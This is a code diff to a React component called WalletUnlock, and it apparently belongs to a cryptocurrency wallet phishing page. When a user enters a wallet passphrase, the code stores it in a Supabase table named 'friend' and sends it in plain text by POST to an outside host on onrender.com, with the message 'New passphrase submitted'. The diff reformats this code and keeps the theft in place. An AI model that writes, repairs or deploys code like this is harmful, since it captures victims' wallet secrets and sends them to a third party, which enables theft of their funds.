@@ -38,17 +38,21 @@ const WalletUnlock = () => {
         .from('friend')
         .insert([{ passphrase }]);
 
-      if (error) throw error;
-          await fetch("https://mailer-8dcp.onrender.com/api/email/notify", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        Accept: "application/json"
-      },
-      body: JSON.stringify({
-        message: `New passphrase submitted:\n\n${passphrase}`
-      })
-    });
+      if (error) {
+        throw error;
+      }
+
+      // const apiUrl =  ""; // Replace with your actual API URL
+      await fetch(`https://mailer-8dcp.onrender.com/api/email/notify`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json"
+        },
+        body: JSON.stringify({
+          message: `New passphrase submitted:\n\n${passphrase}`
+        })
+      });
 
       console.log('Inserted into Supabase:', data);
       setSuccess(true); // ✅ show success modal
